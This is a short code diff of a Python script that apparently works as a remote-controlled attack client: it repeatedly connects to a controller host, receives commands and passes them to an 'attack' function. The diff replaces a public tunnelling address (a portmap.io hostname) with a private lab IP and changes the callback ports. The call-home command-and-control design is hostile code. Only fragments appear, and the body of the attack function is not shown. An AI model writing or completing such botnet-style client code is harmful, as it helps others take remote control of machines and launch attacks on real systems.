@@ -6,8 +6,8 @@ import subprocess
 import asyncio
 import time
 from time import sleep
-RHost = "Sodex-61888.portmap.io"  
-#RHost = "10.0.2.15" 
+   
+RHost = "10.0.2.15" 
 Hilos = []
  
 
@@ -18,7 +18,7 @@ def listener():
     print("[+] Listening")
     while True:
         try:
-            s.connect((RHost, 29561)) 
+            s.connect((RHost, 4445))  
             break
              
 
@@ -48,7 +48,7 @@ def attack(data, *args):
 def main():
     while True:
         try:
-            s.connect((RHost, 4449))
+            s.connect((RHost, 4445))
         except:
             pass
         data = s.recv(128)
@@ -72,7 +72,7 @@ def main():
             
 
         try:
-            s.connect((RHost, 29561))
+            s.connect((RHost, 4445))
         except:
             pass
 
